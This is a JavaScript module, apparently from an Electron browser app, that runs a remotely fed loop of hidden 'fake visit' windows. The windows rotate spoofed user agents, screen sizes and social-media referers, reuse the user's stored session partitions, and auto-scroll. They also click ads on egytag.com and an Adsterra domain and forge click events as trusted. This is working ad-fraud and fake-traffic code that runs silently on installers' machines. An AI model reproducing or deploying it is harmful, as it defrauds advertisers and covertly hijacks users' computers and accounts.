(function (w) {
  if (w.MYSERVERVISITSCRIPT_LOADED) {
    console.log('MYSERVERVISITSCRIPT Aborting 0 ...');
    return;
  }

  w.MYSERVERVISITSCRIPT_LOADED = true;
  w.MYSERVERVISITSCRIPT = true;

  SOCIALBROWSER.visitManager = {
    isTest: SOCIALBROWSER.var.core.id.like('*test*'),
    currentIndex: -1,
    sleep: 1000 * 60 * 10,
    visitOptions: { show: false, timeout: 1000 * 60 * 5, url: 'https://egytag.com/', referer: 'dynamic', proxy: null, partition: null, scroll: true, count: 1, ip: '127.0.0.1', group: 1000 },
    trackingList: [],
    visitList: [
      { url: 'https://egytag.com/post/random', timeout: 1000 * 60 * 10 },
      { url: 'https://egytag.com/torrent/random', timeout: 1000 * 60 * 10 },
    ],
    refererList: [
      'https://www.facebook.com/',
      'https://twitter.com/',
      'https://www.instagram.com/',
      'https://www.pinterest.com/',
      'https://www.reddit.com/',
      'https://www.tumblr.com/',
      'https://www.tiktok.com/',
      'https://flipboard.com/',
      'https://vk.com/',
      'https://getpocket.com/',
      'https://digg.com/video',
      'https://www.linkedin.com/',
      'https://qzone.qq.com/',
      'https://web.wechat.com/?lang=en',
      'https://web.whatsapp.com/',
      'https://www.youtube.com/c/NextCorporation/about',
    ],
    userAgentList: [
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/605.1.15 GNews iOS/5.54.200' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19F77' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.163 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 237.0.0.9.103 (iPhone9,3; iOS 15_5; it_IT; it-IT; scale=2.00; 750x1334; 372720523) NW/3' },
      { url: 'Mozilla/5.0 (iPad; CPU OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/96.0.4664.36 Mobile/15E148 Safari/604.1' },
      { url: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.0; rv:94.0) Gecko/20100101 Firefox/94.0' },

      { url: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36' },
      { url: 'Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0' },

      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/95.0.1020.53' },
      { url: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/81.0.4196.37' },
    ],
    scrrenSizeList: ['1920x1080', '1536x864', '1366x768', '1280x768', '1024x768', '1280x720'],
    screenIndex: -1,
    randomScreenSize: function () {
      if (SOCIALBROWSER.visitManager.scrrenSizeList.length > 0) {
        SOCIALBROWSER.visitManager.screenIndex++;
        if (SOCIALBROWSER.visitManager.scrrenSizeList.length <= SOCIALBROWSER.visitManager.screenIndex) {
          SOCIALBROWSER.visitManager.screenIndex = 0;
        }
        return SOCIALBROWSER.visitManager.scrrenSizeList[SOCIALBROWSER.visitManager.screenIndex];
      } else {
        return '1366x768';
      }
    },
    agentIndex: -1,
    randomUserAgent: function () {
      if (SOCIALBROWSER.visitManager.userAgentList.length > 0) {
        SOCIALBROWSER.visitManager.agentIndex++;
        if (SOCIALBROWSER.visitManager.userAgentList.length <= SOCIALBROWSER.visitManager.agentIndex) {
          SOCIALBROWSER.visitManager.agentIndex = 0;
        }
        return SOCIALBROWSER.visitManager.userAgentList[SOCIALBROWSER.visitManager.agentIndex];
      } else {
        return null;
      }
    },
    refererIndex: -1,
    randomReferer: function () {
      if (SOCIALBROWSER.visitManager.refererList.length > 0) {
        SOCIALBROWSER.visitManager.refererIndex++;
        if (SOCIALBROWSER.visitManager.refererList.length <= SOCIALBROWSER.visitManager.refererIndex) {
          SOCIALBROWSER.visitManager.refererIndex = 0;
        }
        return SOCIALBROWSER.visitManager.refererList[SOCIALBROWSER.visitManager.refererIndex];
      } else {
        return 'https://www.facebook.com/';
      }
    },
    userIndex: -1,
    randomPartition: function () {
      if (SOCIALBROWSER.var.session_list.length > 0) {
        SOCIALBROWSER.visitManager.userIndex++;
        if (SOCIALBROWSER.var.session_list.length <= SOCIALBROWSER.visitManager.userIndex) {
          SOCIALBROWSER.visitManager.userIndex = 0;
        }
        return SOCIALBROWSER.var.session_list[SOCIALBROWSER.visitManager.userIndex].name;
      } else {
        return 'ghost_' + Date.now();
      }
    },
    randomVisit: function () {
      if (SOCIALBROWSER.visitManager.visitList.length > 0) {
        SOCIALBROWSER.visitManager.currentIndex++;
        if (SOCIALBROWSER.visitManager.visitList.length <= SOCIALBROWSER.visitManager.currentIndex) {
          SOCIALBROWSER.visitManager.currentIndex = -1;
          SOCIALBROWSER.visitManager.prepareVisits();
          return null;
        }
        return SOCIALBROWSER.visitManager.visitList[SOCIALBROWSER.visitManager.currentIndex];
      } else {
        return null;
      }
    },
    prepareVisits: function () {
      SOCIALBROWSER.fetchJson(
        {
          url: SOCIALBROWSER.server_url + '/api/visit_list',
          method: 'GET',
        },
        function (data) {
          if (data.reset) {
            SOCIALBROWSER.visitManager.trackingList = [];
          }

          if (data.done && data.list && data.list.length > 0) {
            SOCIALBROWSER.visitManager.visitList = [];
            data.list.forEach((v) => {
              SOCIALBROWSER.visitManager.visitList.push(v);
            });
          }
        }
      );
    },
  };

  SOCIALBROWSER.visitManager.createFakeVisitWindow = function (op) {
    let options = { ...SOCIALBROWSER.visitManager.visitOptions, ...op };
    let preload = SOCIALBROWSER.dir + '/browser_files/js/context-menu.js';

    let scrren_size = SOCIALBROWSER.visitManager.randomScreenSize().split('x');

    let win = new SOCIALBROWSER.remote.BrowserWindow({
      show: options.show,
      width: parseInt(scrren_size[0] || '1366'),
      height: parseInt(scrren_size[1] || '768'),
      skipTaskbar: true,
      webPreferences: {
        sandbox: false,
        contextIsolation: false,
        enableRemoteModule: true,
        nodeIntegrationInSubFrames: true,
        partition: options.partition || SOCIALBROWSER.visitManager.randomPartition(),
        webaudio: false,
        preload: preload,
      },
    });

    win.webContents.audioMuted = true;

    if (options.userAgent) {
      win.webContents.userAgent = options.userAgent;
    } else {
      win.webContents.userAgent = SOCIALBROWSER.visitManager.randomUserAgent().url;
    }

    if (SOCIALBROWSER.visitManager.isTest) {
      win.setSkipTaskbar(false);
      win.showInactive();
      win.openDevTools();
      win.webContents.on('context-menu', (event, params) => {
        win.webContents.send('context-menu', params);
      });
    } else {
      if (options.show) {
        win.maximize();
      } else {
        win.hide();
      }
    }

    win.setMenuBarVisibility(false);
    if (options.proxy) {
      const ss = win.webContents.session;
      ss.setProxy(
        {
          proxyRules: options.proxy,
          proxyBypassRules: '127.0.0.1',
        },
        function () {}
      );
    }
    if (options.referer == 'dynamic') {
      options.referer = { url: SOCIALBROWSER.visitManager.randomReferer() };
    } else if (options.referer == 'direct' || !options.referer.like('http*')) {
      options.referer = null;
    } else {
      options.referer = { url: options.referer };
    }

    let code = `SOCIALBROWSER.fakeview123 = '${SOCIALBROWSER.to123(options)}';`;
    let code0 = `if (!window.SOCIALBROWSER) {
  window.SOCIALBROWSER = {
    var: {
      core: { id: '' },
      blocking: {
        javascript: {},
        popup: {},
        core: {},
        youtube: {},
      },
    },
    isIframe: () => {
      try {
        return window.self !== window.top;
      } catch (e) {
        return true;
      }
    },
  };
}
SOCIALBROWSER.url = SOCIALBROWSER.url || require('url');
SOCIALBROWSER.var.blocking.javascript.block_window_open = true;
SOCIALBROWSER.var.blocking.popup.allow_external = false;
SOCIALBROWSER.var.blocking.popup.allow_internal = false;
window.open = function (url) {
  console.log(' code0 [ window.open ] ' + url);
  if (!url || url == 'about:blank') {
    return;
  }
  setTimeout(function () {
    document.location.href = url;
  }, 3 * 1000);
};

localStorage.clear = () => {
  console.log('User Request Clear LocalStorage');
};

if (!SOCIALBROWSER.isIframe() && '${options.scroll}' == 'true') {
  function scrollRandom() {
    if (SOCIALBROWSER.scrollStop) {
      return;
    }

    let y = window.scrollY;
    y = y + (Math.floor(Math.random() * 150) + 50);
    if (document.body && window.innerHeight + window.scrollY >= document.body.offsetHeight) {
      y = 0;
      document.documentElement.scrollTop = 0;
    }
    window.scrollTo(0, y);

    setTimeout(() => {
      scrollRandom();
    }, 1000 * (Math.floor(Math.random() * 5) + 1));
  }

  setTimeout(() => {
    scrollRandom();
  }, 1000 * 20);
}

if (!SOCIALBROWSER.from123) {
  SOCIALBROWSER.$base64Letter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
  SOCIALBROWSER.$base64Numbers = [];
  for (let $i = 11; $i < 99; $i++) {
    if ($i % 10 !== 0 && $i % 11 !== 0) {
      SOCIALBROWSER.$base64Numbers.push($i);
    }
  }

  SOCIALBROWSER.toJson = (obj) => {
    if (typeof obj === undefined || obj === null) {
      return '';
    }
    return JSON.stringify(obj);
  };

  SOCIALBROWSER.fromJson = (str) => {
    if (typeof str !== 'string') {
      return str;
    }
    return JSON.parse(str);
  };

  SOCIALBROWSER.toBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    if (typeof str !== 'string') {
      str = SOCIALBROWSER.toJson(str);
    }
    return btoa(unescape(encodeURIComponent(str)));
  };

  SOCIALBROWSER.fromBase64 = (str) => {
    if (typeof str === undefined || str === null || str === '') {
      return '';
    }
    return decodeURIComponent(escape(atob(str)));
  };

  SOCIALBROWSER.to123 = (data) => {
    data = SOCIALBROWSER.toBase64(data);
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let letter = data[i];
      newData += SOCIALBROWSER.$base64Numbers[SOCIALBROWSER.$base64Letter.indexOf(letter)];
    }
    return newData;
  };

  SOCIALBROWSER.from123 = (data) => {
    let newData = '';
    for (let i = 0; i < data.length; i++) {
      let num = data[i] + data[i + 1];
      let index = SOCIALBROWSER.$base64Numbers.indexOf(parseInt(num));
      newData += SOCIALBROWSER.$base64Letter[index];
      i++;
    }
    newData = SOCIALBROWSER.fromBase64(newData);
    return newData;
  };

  SOCIALBROWSER.typeOf = SOCIALBROWSER.typeof = function type(elem) {
    return Object.prototype.toString.call(elem).slice(8, -1);
  };
}

if (SOCIALBROWSER.fakeview123) {
  SOCIALBROWSER.fakeview = JSON.parse(SOCIALBROWSER.from123(SOCIALBROWSER.fakeview123));
}

if (!SOCIALBROWSER.fakeview) {
  SOCIALBROWSER.fakeview = {
    url: 'http://social-browser.com/api/youtube_random_video',
    referer: { url: 'https://www.olx.com.eg/' },
    like: true,
    subscribe: true,
  };
}
`;
    let code1 = `function __document__ready__1() {
    if (SOCIALBROWSER.isIframe()) {
        return;
    }

    console.log(' [ CODE 1 ] ');

    if (document.querySelector('body')) {
        setTimeout(function () {
            let a = document.createElement('a');
            a.href = SOCIALBROWSER.fakeview.url;
            a.id = '__a_injected';
            a.innerHTML = SOCIALBROWSER.fakeview.url;
            a.setAttribute('target', '_self');
            document.querySelector('body').appendChild(a);
            a.style.backgroundColor = 'red';
            a.style.color = '#ffffff';
            a.style.fontSize = '22px';
            a.scrollIntoView();
            a.click();
        }, 5 * 1000);
    }

    setTimeout(function () {
        console.log(' [ Force Redirect .... ] ');
        document.location.href = SOCIALBROWSER.fakeview.url;
    }, 20 * 1000);
}
`;
    let code2 = `function __document__ready__2() {
    if (SOCIALBROWSER.isIframe()) {
        return;
    }

    console.log(' [ CODE 2 ] ');

    setInterval(() => {
        let ad1 = document.querySelector('html>div img');
        if (ad1) {
            ad1.click();
        }
        let ad2 = document.querySelector('#next-id');
        if (ad2) {
            ad2.click();
        }
    }, 1000 * 20);
}
`;
    let codex = `let fnn = null;
let referer_hostname = null;
let url_hostname = null;
if (SOCIALBROWSER.fakeview.referer && SOCIALBROWSER.fakeview.referer.url) {
  referer_hostname = SOCIALBROWSER.url.parse(SOCIALBROWSER.fakeview.referer.url).hostname;
  url_hostname = SOCIALBROWSER.url.parse(SOCIALBROWSER.fakeview.url).hostname;
}
if (SOCIALBROWSER.fakeview.hostname && document.location.hostname.contains(SOCIALBROWSER.fakeview.hostname)) {
  fnn = __document__ready__2;
} else if (url_hostname && document.location.hostname.contains(url_hostname)) {
  fnn = __document__ready__2;
} else if (SOCIALBROWSER.fakeview.hostname && !document.location.hostname.contains(SOCIALBROWSER.fakeview.hostname)) {
  fnn = __document__ready__1;
} else if (referer_hostname && document.location.hostname.contains(referer_hostname) && !document.location.hostname.contains(url_hostname)) {
  fnn = __document__ready__1;
} else {
  fnn = __document__ready__2;
}

if (document.readyState !== 'loading') {
  fnn();
} else {
  document.addEventListener('DOMContentLoaded', () => {
    fnn();
  });
}
`;
    let code_events = `((w) => {
    SOCIALBROWSER.allowTrustedEvents = function () {
        if (SOCIALBROWSER.allowTrustedEventsSets) {
            return;
        }
        SOCIALBROWSER.allowTrustedEventsSets = true;

        SOCIALBROWSER.handleEventListener = function (eventTarget) {
            eventTarget.handler2 = function (...params) {
                if (eventTarget.type.like('click') && params.length > 0) {
                    let default_event = params[0];

                    eventTarget.event2 = eventTarget.event2 || {
                        get isTrusted() {
                            return true;
                        },
                        get view() {
                            return default_event.view;
                        },
                        get target() {
                            return default_event.target;
                        },
                        get cancelable() {
                            return default_event.cancelable;
                        },
                        get bubbles() {
                            return default_event.bubbles;
                        },
                        get defaultPrevented() {
                            return default_event.defaultPrevented;
                        },
                        get timeStamp() {
                            return default_event.timeStamp;
                        },
                        get composed() {
                            return default_event.composed;
                        },
                        get currentTarget() {
                            return default_event.currentTarget;
                        },
                        get eventPhase() {
                            return default_event.eventPhase;
                        },

                        get srcElement() {
                            return default_event.srcElement;
                        },
                        get relatedTarget() {
                            return default_event.relatedTarget;
                        },
                        get region() {
                            return default_event.region;
                        },
                        get path() {
                            return default_event.path;
                        },
                        get type() {
                            return default_event.type;
                        },
                        get which() {
                            return default_event.which;
                        },
                        get shiftKey() {
                            return default_event.shiftKey;
                        },
                        get metaKey() {
                            return default_event.metaKey;
                        },
                        get ctrlKey() {
                            return default_event.ctrlKey;
                        },
                        get altKey() {
                            return default_event.altKey;
                        },
                        get screenY() {
                            return default_event.screenY || 300;
                        },
                        get screenX() {
                            return default_event.screenX || 450;
                        },

                        get pageY() {
                            return default_event.pageY || 300;
                        },
                        get pageX() {
                            return default_event.pageX || 450;
                        },
                        get clientY() {
                            return default_event.clientY || 300;
                        },
                        get clientX() {
                            return default_event.clientX || 450;
                        },
                        get offsetY() {
                            return default_event.offsetY;
                        },
                        get offsetX() {
                            return default_event.offsetX;
                        },
                        get movementY() {
                            return default_event.movementY;
                        },
                        get movementX() {
                            return default_event.movementX;
                        },
                        get buttons() {
                            return default_event.buttons;
                        },
                        get button() {
                            return default_event.button;
                        },
                        get originalEvent() {
                            return default_event;
                        },
                        initEvent() {
                            return default_event.initEvent();
                        },
                        preventDefault() {
                            return default_event.preventDefault();
                        },
                        stopImmediatePropagation() {
                            return default_event.stopImmediatePropagation();
                        },
                        stopPropagation() {
                            this.stopPropagationSet = true;
                            return default_event.stopPropagation();
                        },
                        composedPath() {
                            return default_event.composedPath();
                        },
                    };
                    params[0] = eventTarget.event2;
                    eventTarget.handler(...params);
                } else {
                    eventTarget.handler(...params);
                }
            };
        };

        if (EventTarget.prototype.addEventListener) {
            EventTarget.prototype.removeEventListener0 = EventTarget.prototype.removeEventListener;
            EventTarget.prototype.removeEventListener = function (type, handler, option) {
                let exists = false;
                if (typeof type == 'string' && handler && typeof handler === 'function') {
                    SOCIALBROWSER.events.forEach((ev) => {
                        if (ev.this === this && ev.handler === handler) {
                            exists = true;
                            return this.removeEventListener0(ev.type, ev.handler2, ev.option);
                        }
                    });
                }
                if (!exists) {
                    return this.removeEventListener0(type, handler, option);
                }
            };
            EventTarget.prototype.addEventListener0 = EventTarget.prototype.addEventListener;
            EventTarget.prototype.removeEvent = function (type) {
                delete this.listeners[type];
            };
            EventTarget.prototype.addEventListener = function (type, handler, option) {
                let eventTarget = {
                    this: this,
                    selector: '',
                    enabled: true,
                    type: type,
                    handler: handler,
                    handler2: handler,
                    option: option,
                };
                let selector = '';

                if (this instanceof Document) {
                    eventTarget.selector += 'document';
                } else if (this instanceof Window) {
                    eventTarget.selector += 'window';
                } else if (this instanceof Element) {
                    eventTarget.selector += this.tagName;
                }

                if (typeof type == 'string') {
                    eventTarget.selector += this.id ? '#' + this.id : this.className ? '.' + this.className : type;
                    if (typeof type == 'string' && eventTarget.selector.like(SOCIALBROWSER.eventOff) && !eventTarget.selector.like(SOCIALBROWSER.eventOn)) {
                        SOCIALBROWSER.log(selector + '::OFF:: ');
                        eventTarget.enabled = false;
                        SOCIALBROWSER.events.push(eventTarget);
                        return;
                    } else {
                        if (typeof type == 'string' && eventTarget.handler && typeof eventTarget.handler === 'function') {
                            SOCIALBROWSER.handleEventListener(eventTarget);
                        }
                    }
                    SOCIALBROWSER.events.push(eventTarget);
                }

                return this.addEventListener0(eventTarget.type, eventTarget.handler2, eventTarget.option);
            };
        }
    };

    SOCIALBROWSER.allowTrustedEvents();
})(window);
`;

    if (op.url.like('*egytag.com*')) {
      code2 = `function __document__ready__2() {
    if (document.location.hostname.like('*egytag.com')) {
        console.log(' [ Real Visit To Egytag.com ] ');
        console.log('URL        : ' + document.location.href);
        console.log('Referrer   : ' + document.referrer);
        console.log('User Agent : ' + navigator.userAgent);

        function isViewable(element) {
            const rect = element.getBoundingClientRect();
            return (
                rect.top >= 0 &&
                rect.left >= 0 &&
                rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
                rect.right <= (window.innerWidth || document.documentElement.clientWidth)
            );
        }

        function findGoodPost() {
            let ok = false;
            let arr = document.querySelectorAll('.post-url');
            arr.forEach((a) => {
                if (!ok && isViewable(a)) {
                    ok = true;
                    a.setAttribute('target', '_self');
                    SOCIALBROWSER.redirectLink = a.getAttribute('href');
                    a.click();
                }
            });
            if (!ok) {
                setTimeout(() => {
                    findGoodPost();
                }, 1000 * (Math.floor(Math.random() * 60) + 30));
            }
        }

        if (document.location.pathname.like('*post*')) {
            setTimeout(() => {
                document.querySelector('.brand a').click();
            }, 1000 * (Math.floor(Math.random() * 60) + 30));
        } else {
            setTimeout(() => {
                findGoodPost();
            }, 1000 * (Math.floor(Math.random() * 120) + 60));
        }

        let ss = setInterval(() => {
            let ins = document.querySelector('html > ins');
            if (ins && ins.style.display != 'none') {
                clearInterval(ss);
                document.documentElement.scrollTop = 0;
                SOCIALBROWSER.scrollStop = true;
                if (false && SOCIALBROWSER.currentWindow && SOCIALBROWSER.webContents) {
                    let x = Math.floor(Math.random() * 800) + 400;
                    let y = Math.floor(Math.random() * 300) + 700;
                    SOCIALBROWSER.currentWindow.focus();
                    SOCIALBROWSER.webContents.sendInputEvent({ type: 'mouseDown', x: x, y: y, button: 'left', clickCount: 1 });
                    SOCIALBROWSER.webContents.sendInputEvent({ type: 'mouseUp', x: x, y: y, button: 'left', clickCount: 1 });
                }

                if (SOCIALBROWSER.redirectLink) {
                    let form = document.createElement('form');
                    form.action = SOCIALBROWSER.redirectLink;
                    form.method = 'get';
                    form.name = 'redirect';
                    document.body.appendChild(form);
                }
                setTimeout(() => {
                    if (SOCIALBROWSER.redirectLink) {
                        document.forms['redirect'].submit();
                    } else {
                        document.location.reload();
                    }
                }, 1000 * 15);
            }
        }, 1000 * 3);

        setInterval(() => {
            let ad1 = document.querySelector('html>div img');
            if (ad1) {
                ad1.click();
            }
            let ad2 = document.querySelector('#next-id');
            if (ad2) {
                ad2.click();
            }
        }, 1000 * 10);
    }
}
`;
    } else if (op.url.like('*safestgatetocontent.com*')) {
      code2 = `function __document__ready__2() {
  if (true) {
    SOCIALBROWSER.log(' ');
    SOCIALBROWSER.log(' -------------------------------------------------- ');
    SOCIALBROWSER.log(' [ Real Visit To Adsterra ] ');
    SOCIALBROWSER.log('URL        : ' + document.location.href);
    SOCIALBROWSER.log('Referrer   : ' + document.referrer);
    SOCIALBROWSER.log('User Agent : ' + navigator.userAgent);
    SOCIALBROWSER.log(' -------------------------------------------------- ');
    SOCIALBROWSER.log(' ');

    function isViewable(element) {
      const rect = element.getBoundingClientRect();
      return rect.top >= 0 && rect.left >= 0 && rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && rect.right <= (window.innerWidth || document.documentElement.clientWidth);
    }

    function findGoodLink() {
      SOCIALBROWSER.log('finding Good Link ... ');
      let ok = false;
      let arr = document.querySelectorAll('a[href]');
      arr.forEach((a) => {
        if (!ok && a.href && a.href.length > 2 && isViewable(a)) {
          ok = true;
          a.setAttribute('target', '_self');
          SOCIALBROWSER.redirectLink = a.getAttribute('href');
          SOCIALBROWSER.log('Finded Good Link : ' + SOCIALBROWSER.redirectLink);
          a.click();
        }
      });

      if (!ok) {
        let buttons = document.querySelectorAll('button');
        buttons.forEach((b) => {
          if (!ok && isViewable(b)) {
            ok = true;
            SOCIALBROWSER.log('Finded Good Button ^_^');
            b.click();
          }
        });
      }

      if (!ok) {
        setTimeout(() => {
          findGoodLink();
        }, 1000 * (Math.floor(Math.random() * 10) + 5));
      } else {
        setTimeout(() => {
          if (SOCIALBROWSER.redirectLink) {
            document.location.href = SOCIALBROWSER.redirectLink;
          }
        }, 1000 * 10);
      }
    }

    setTimeout(() => {
      findGoodLink();
    }, 1000 * (Math.floor(Math.random() * 20) + 10));
  }
}
`;
    } else {
      code2 = `function __document__ready__2() {
  if (true) {
    SOCIALBROWSER.log(' ');
    SOCIALBROWSER.log(' -------------------------------------------------- ');
    SOCIALBROWSER.log(' [ Real Visit To Ads ] ');
    SOCIALBROWSER.log('URL        : ' + document.location.href);
    SOCIALBROWSER.log('Referrer   : ' + document.referrer);
    SOCIALBROWSER.log('User Agent : ' + navigator.userAgent);
    SOCIALBROWSER.log(' -------------------------------------------------- ');
    SOCIALBROWSER.log(' ');

    function isViewable(element) {
      const rect = element.getBoundingClientRect();
      return rect.top >= 0 && rect.left >= 0 && rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && rect.right <= (window.innerWidth || document.documentElement.clientWidth);
    }

    function findGoodLink() {
      SOCIALBROWSER.log('finding Good Link ... ');
      let ok = false;
      let arr = document.querySelectorAll('a[href]');
      arr.forEach((a) => {
        if (!ok && a.href && a.href.length > 2 && isViewable(a)) {
          ok = true;
          a.setAttribute('target', '_self');
          SOCIALBROWSER.redirectLink = a.getAttribute('href');
          SOCIALBROWSER.log('Finded Good Link : ' + SOCIALBROWSER.redirectLink);
          a.click();
        }
      });

      if (!ok) {
        let buttons = document.querySelectorAll('button');
        buttons.forEach((b) => {
          if (!ok && isViewable(b)) {
            ok = true;
            SOCIALBROWSER.log('Finded Good Button ^_^');
            b.click();
          }
        });
      }

      if (!ok) {
        setTimeout(() => {
          findGoodLink();
        }, 1000 * (Math.floor(Math.random() * 10) + 5));
      } else {
        setTimeout(() => {
          if (SOCIALBROWSER.redirectLink) {
            document.location.href = SOCIALBROWSER.redirectLink;
          }
        }, 1000 * 10);
      }
    }

    setTimeout(() => {
      findGoodLink();
    }, 1000 * (Math.floor(Math.random() * 20) + 10));
  }
}
`;
    }

    let code_injected = code + code0 + code_events + code1 + code2 + codex;
    if (SOCIALBROWSER.var.core.version < '2021.03.01') {
      win.webContents.addListener('dom-ready', function (event) {
        win.webContents.executeJavaScript(code_injected);
      });
    } else {
      SOCIALBROWSER.call('[set][window][setting]', {
        win_id: win.id,
        name: 'eval',
        code: code_injected,
      });
    }

    win.loadURL(options.referer ? options.referer.url : options.url).catch((err) => {
      if (err.code === 'ERR_ABORTED') {
        console.log('visit-manager.js :  win.loadURL ', err);
      }
    });

    win.on('close', function () {
      win.destroy();
    });

    win.on('closed', function () {
      setTimeout(
        function () {
          SOCIALBROWSER.visitManager.runFakeVisit();
        },
        SOCIALBROWSER.visitManager.isTest ? 0 : options.timeout
      );
    });

    win.webContents.on('did-fail-load', function (e) {
      if (e.isMainFrame) {
        win.destroy();
      }
    });

    win.webContents.session.on('will-download', (event, item, webContents) => {
      event.preventDefault();
      console.log('visit-manager.js :  will-download ');
    });

    win.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
      callback(false);
    });
    win.webContents.session.setPermissionCheckHandler((webContents, permission) => {
      return false;
    });

    if (win.webContents.setWindowOpenHandler) {
      win.webContents.setWindowOpenHandler(({ url, frameName }) => {
        return { action: 'deny' };
      });

      win.webContents.on('did-create-window', (win, { url, frameName, options, disposition, referrer, postData }) => {});
    }
    win.webContents.on('new-window', function (event, url, frameName, disposition, options, referrer, postBody) {
      event.preventDefault();
      console.log('visit-manager.js :  new-window ');
    });

    setTimeout(function () {
      if (win && !win.isDestroyed()) {
        win.destroy();
      }
    }, options.timeout);
  };

  SOCIALBROWSER.visitManager.Tracking = function (v) {
    let t = { group_count: 0 };
    v.guid = v.referer + '---' + v.url + '---' + v.ip + '---' + v.group;
    SOCIALBROWSER.visitManager.trackingList.forEach((track) => {
      if (track.guid == v.guid) {
        track.count++;
        t = { ...track, ...t };
      }
      if (track.group == v.group && track.ip == v.ip) {
        t.group_count++;
      }
    });
    if (!t.guid) {
      t = {
        guid: v.guid,
        count: 1,
        group_count: 1,
        group: v.group,
        ip: v.ip,
        ...t,
      };
      SOCIALBROWSER.visitManager.trackingList.push(t);
    }
    return t;
  };

  SOCIALBROWSER.visitManager.runFakeVisit = function () {
    SOCIALBROWSER.visitManager.prepareVisits();
    setTimeout(
      () => {
        let v = SOCIALBROWSER.visitManager.randomVisit();
        if (v) {
          v = { ...SOCIALBROWSER.visitManager.visitOptions, ...v };
          let track = SOCIALBROWSER.visitManager.Tracking(v);
          if ((v.count && v.count < track.count) || track.group_count > 5) {
            SOCIALBROWSER.visitManager.runFakeVisit();
          } else {
            SOCIALBROWSER.visitManager.createFakeVisitWindow(v);
          }
        } else {
          SOCIALBROWSER.visitManager.runFakeVisit();
        }
      },
      SOCIALBROWSER.visitManager.isTest ? 1000 * 5 : 1000 * 60
    );
  };

  SOCIALBROWSER.visitManager.runFakeVisit();

  SOCIALBROWSER.visitManager.startTime = Date.now();
  setInterval(() => {
    if (Date.now() - SOCIALBROWSER.visitManager.startTime > 1000 * 60 * 60 * 24) {
      SOCIALBROWSER.visitManager.trackingList = [];
      console.clear();
    }
  }, 1000 * 60 * 60);
})(window);
